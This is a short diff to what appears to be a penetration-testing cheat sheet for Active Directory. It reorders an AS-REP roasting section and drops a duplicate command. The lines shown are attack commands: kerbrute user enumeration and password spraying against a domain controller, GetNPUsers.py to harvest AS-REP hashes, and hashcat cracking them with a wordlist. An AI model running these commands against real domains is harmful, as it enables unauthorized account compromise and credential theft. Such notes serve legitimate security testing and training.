@@ -55,11 +55,10 @@ kerbrute userenum --dc <domain_controller> -d <domain.local> users.txt
 kerbrute passwordspray -d corp.local --dc 192.168.1.10 valid_users.txt 'Winter2025!'
 
 
+# AS-REP roasting
 GetNPUsers.py corp.local/ -usersfile valid_users.txt -dc-ip 192.168.1.10 -outputfile asreproast_hashes.txt
 hashcat -m 18200 asreproast_hashes.txt rockyou.txt
 
-# AS-REP roasting
-GetNPUsers.py corp.local/ -usersfile valid_users.txt -dc-ip 192.168.1.10 -outputfile asreproast.txt
 
 ```
 
